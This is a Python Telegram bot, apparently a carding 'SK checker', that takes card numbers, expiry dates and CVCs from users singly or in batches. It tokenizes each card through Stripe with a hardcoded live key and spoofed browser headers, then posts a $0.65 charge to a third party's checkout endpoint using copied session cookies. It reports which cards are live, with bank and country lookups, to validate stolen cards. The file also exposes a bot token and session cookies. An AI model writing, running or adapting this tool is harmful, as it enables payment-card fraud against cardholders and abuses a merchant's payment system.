import requests
import uuid
import telebot
from telebot import types
import time
import json

bot = telebot.TeleBot("7179367206:AAGauAuI4MQCZgLymvn3E2iU1r8ZJOHj-Yo")

def get_bin_info(bin_number):
    try:
        api_url = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}").json()
        brand = api_url.get("brand", "N/A")
        card_type = api_url.get("type", "N/A")
        level = api_url.get("level", "N/A")
        bank = api_url.get("bank", "N/A")
        country_name = api_url.get("country_name", "N/A")
        country_flag = api_url.get("country_flag", "🏳️")
        
        bin_info = f"{country_name} {country_flag} - {brand} - {card_type} - BANK: {bank}"
        return bin_info
    except:
        return "N/A"

def create_card_token(card_number, exp_month, exp_year, cvc):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    }
    
    data = {
        'guid': 'fe5d9216-ca1c-4486-bd2a-d786fbb9ed88607e7e',
        'muid': '1c26bb28-5960-47ed-8cec-b12c8ff21114fd6e0e',
        'sid': '2d1ff066-bcb4-47c1-948d-71ac0ab28cfa8c6c6e',
        'referrer': 'https://node-stripe-ncnb.onrender.com',
        'time_on_page': '17821',
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'payment_user_agent': 'stripe.js/ee811adf1a; stripe-js-v3/ee811adf1a; split-card-element',
        'key': 'pk_live_51OnxYlJgG6MrFYN5ZyDqREF292w7CDyawarpXxZIEHflHcfJb9KYLG4mhAHyPP5eH6M9Ax0mqPxb2Jj64xiqY3hs004AqlVUmx'
    }
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/tokens',
            headers=headers,
            data=data
        )
        return response
    except Exception as e:
        return None

def make_payment(token):
    if not token:
        return None
        
    headers = {
        'authority': 'node-stripe-ncnb.onrender.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://node-stripe-ncnb.onrender.com',
        'referer': 'https://node-stripe-ncnb.onrender.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'cookie': 'connect.sid=s%3AAG3cUFSj6RHbObNu1CQfpQhi5WN_1WEO.x3fMApq6GRbeKyfByJ1ev8oACs55Cg1XLT41KNPaN%2FU; __stripe_mid=1c26bb28-5960-47ed-8cec-b12c8ff21114fd6e0e; __stripe_sid=2d1ff066-bcb4-47c1-948d-71ac0ab28cfa8c6c6e'
    }
    
    payload = {'token': token}
    
    try:
        response = requests.post(
            'https://node-stripe-ncnb.onrender.com/charge',
            headers=headers,
            json=payload
        )
        return response
    except Exception as e:
        return None

def process_payment_with_retry(card_number, exp_month, exp_year, cvc, max_retries=5):
    for attempt in range(max_retries):
        token_response = create_card_token(card_number, exp_month, exp_year, cvc)
        
        if token_response and token_response.status_code == 200:
            token = token_response.json().get('id')
            payment_response = make_payment(token)
            
            if payment_response:
                try:
                    result = payment_response.json()
                    if isinstance(result, dict):
                        return result
                    else:
                        if attempt < max_retries - 1:
                            time.sleep(1)
                            continue
                except json.JSONDecodeError:
                    if attempt < max_retries - 1:
                        time.sleep(1)
                        continue
                    return {'error': 'Invalid JSON received from the Stripe API', 'decline_code': 'json_error'}
                except Exception as e:
                    return {'error': str(e), 'decline_code': 'unknown_error'}
            else:
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                return {'error': 'Payment processing error', 'decline_code': 'processing_error'}
        else:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return {'error': 'Token creation failed', 'decline_code': 'token_error'}
    
    return {'error': 'Max retries reached', 'decline_code': 'max_retries'}

@bot.message_handler(commands=['cc'])
def handle_cc(message):
    try:
        parts = message.text.split(' ')[1].split('|')
        if len(parts) != 4:
            bot.reply_to(message, "Invalid format. Use /cc card_number|exp_month|exp_year|cvc")
            return
            
        card_number, exp_month, exp_year, cvc = parts
        bin_number = card_number[:6]  # Get first 6 digits for BIN lookup
        
        # Create initial checking message
        checking_msg = f"""
𝗦𝗞 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝟬.𝟲𝟱 𝗨𝗦𝗗 .... 𝗪𝗔𝗜𝗧 
𝙲𝙰𝚁𝙳 : <code>{card_number}|{exp_month}|{exp_year}|{cvc}</code>
ꜱᴛᴀᴛᴜꜱ : 𝘐𝘕 𝘊𝘏𝘌𝘊𝘒𝘐𝘕𝘎 | {message.from_user.first_name}
"""
        sent_msg = bot.reply_to(message, checking_msg, parse_mode='HTML')
        
        # Get BIN information
        bin_info = get_bin_info(bin_number)
        
        # Process the payment with retries
        result = process_payment_with_retry(card_number, exp_month, exp_year, cvc)
        
        if result.get('success', False) == True:
            # Successful payment case
            final_msg = f"""
☈ 𝘚𝘒 𝘊𝘏𝘈𝘙𝘎𝘌 𝟬.𝟲𝟱 𝗨𝗦𝗗 
            𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗𝘌) ↯

𐓏 𝙲𝙰𝚁𝙳 : <code>{card_number}|{exp_month}|{exp_year}|{cvc}</code>
𐓏 �𝘗𝘐 𝘙𝘌𝘚𝘗𝘖𝘕𝘚𝘌 : Charged 
𐓏 𝘊𝘖𝘋𝘌 : 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘬 𝘊𝘢𝘳𝘥 (0.65$) ✅️ 
{bin_info}
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 : {message.from_user.first_name}"""
        else:
            # Failed payment case
            error_msg = result.get('error', 'Unknown error')
            decline_code = result.get('decline_code', 'No decline code')
            
            # Check for insufficient funds case
            if "insufficient funds" in error_msg.lower() or decline_code == "insufficient_funds":
                emoji = "✅️"
            else:
                emoji = "❌️"
            
            final_msg = f"""
☈ 𝘚𝘒 𝘊𝘏𝘈𝘙𝘎𝘌 𝟬.𝟲𝟱 𝗨𝗦𝗗 
            𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗𝘌) ↯

𐓏 𝙲𝙰𝚁𝙳 : <code>{card_number}|{exp_month}|{exp_year}|{cvc}</code>
𐓏 𝘈𝘗𝘐 𝘙𝘌𝘚𝘗𝘖𝘕𝘚𝘌 : {error_msg}{" " + emoji if emoji else ""}
𐓏 𝘋𝘌𝘊𝘓𝘐𝘕𝘌 𝘊𝘖𝘋𝘌 : {decline_code}{" " + emoji if emoji else ""} 
{bin_info}
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 : {message.from_user.first_name}"""
        
        # Edit the original message with the final result
        bot.edit_message_text(chat_id=message.chat.id, 
                             message_id=sent_msg.message_id, 
                             text=final_msg,
                             parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error processing your request: {str(e)}")

@bot.message_handler(commands=['macc'])
def handle_macc(message):
    try:
        # Extract all cards from the message
        cards_text = message.text.split(' ', 1)[1]
        cards = [card.strip() for card in cards_text.split('\n') if card.strip()]
        
        # Limit to 15 cards max
        if len(cards) > 15:
            bot.reply_to(message, "Maximum 15 cards allowed at once.")
            return
            
        valid_cards = []
        invalid_cards = []
        
        # Validate each card
        for card in cards:
            parts = card.split('|')
            if len(parts) == 4:
                valid_cards.append(parts)
            else:
                invalid_cards.append(card)
        
        if not valid_cards:
            bot.reply_to(message, "No valid cards found. Format: /macc card1|mm|yy|cvv\ncard2|mm|yy|cvv")
            return
            
        # Create initial checking message
        initial_msg = f"""
𝘚𝘒 𝘔𝘈𝘚𝘚 𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗E 0.65$) 

𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦 : {len(valid_cards)}
𝘚𝘛𝘈𝘛𝘜𝘚 : 𝘐𝘕 𝘗𝘌𝘕𝘋𝘐𝘕𝘎 𝘊𝘈𝘙𝘋𝘚 WAIT ... 
"""
        sent_msg = bot.reply_to(message, initial_msg, parse_mode='HTML')
        
        # Process each card one by one
        results = []
        for i, (card_number, exp_month, exp_year, cvc) in enumerate(valid_cards):
            time.sleep(4)  # Wait 4 seconds between each card
            
            bin_number = card_number[:6]
            bin_info = get_bin_info(bin_number)
            
            # Process the payment with retries
            result = process_payment_with_retry(card_number, exp_month, exp_year, cvc)
            
            if result.get('success', False) == True:
                # Successful payment case
                card_result = f"""
𐓏 𝙲𝙰𝚁𝙳 : <code>{card_number}|{exp_month}|{exp_year}|{cvc}</code>
𐓏 𝘈𝘗𝘐 𝘙𝘌𝘚𝘗𝘖𝘕𝘚𝘌 : Charged 
𐓏 𝘊𝘖𝘋𝘌 : 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘬 𝘊𝘢𝘳𝘥 (0.65$) ✅️
{bin_info}"""
            else:
                # Failed payment case
                error_msg = result.get('error', 'Unknown error')
                decline_code = result.get('decline_code', 'No decline code')
                
                # Check for insufficient funds case
                if "insufficient funds" in error_msg.lower() or decline_code == "insufficient_funds":
                    emoji = "✅️"
                else:
                    emoji = "❌️"
                
                card_result = f"""
𐓏 𝙲𝙰𝚁𝙳 : <code>{card_number}|{exp_month}|{exp_year}|{cvc}</code>
𐓏 𝘈𝘗𝘐 𝘙𝘌𝘚𝘗𝘖𝘕𝘚𝘌 : {error_msg}{" " + emoji if emoji else ""}
𐓏 𝘋𝘌𝘊𝘓𝘐𝘕𝘌 𝘊𝘖𝘋𝘌 : {decline_code}{" " + emoji if emoji else ""}
{bin_info}"""
            
            results.append(card_result)
            
            # Update the message with all processed cards so far
            progress_msg = f"""
𝘚𝘒 𝘔𝘈𝘚𝘚 𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗E 0.65$) 

𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦 : {len(valid_cards)}
𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗘𝗗 : {i+1}/{len(valid_cards)}
𝘚𝘛𝘈𝘛𝘜𝘚 : 𝘐𝘕 𝘗𝘙𝘖𝘎𝘙𝘌𝘚𝘚... 

""" + "\n".join(results)
            
            bot.edit_message_text(chat_id=message.chat.id,
                               message_id=sent_msg.message_id,
                               text=progress_msg,
                               parse_mode='HTML')
        
        # Final message with all results
        final_msg = f"""
𝘚𝘒 𝘔𝘈𝘚𝘚 𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗E 0.65$) 

𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦 : {len(valid_cards)}
𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 : {len(valid_cards)}/{len(valid_cards)}
𝘚𝘛𝘈𝘛𝘜𝘚 : 𝘊𝘖𝘔𝘗𝘓𝘌𝘛𝘌𝘋 

""" + "\n".join(results) + f"""

𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 : {message.from_user.first_name}"""
        
        bot.edit_message_text(chat_id=message.chat.id,
                           message_id=sent_msg.message_id,
                           text=final_msg,
                           parse_mode='HTML')
        
        # Notify about invalid cards if any
        if invalid_cards:
            invalid_msg = "Invalid cards (ignored):\n" + "\n".join(invalid_cards)
            bot.reply_to(message, invalid_msg)
            
    except IndexError:
        bot.reply_to(message, "Please provide cards after the command. Format: /macc card1|mm|yy|cvv\ncard2|mm|yy|cvv")
    except Exception as e:
        bot.reply_to(message, f"Error processing your request: {str(e)}")

bot.polling()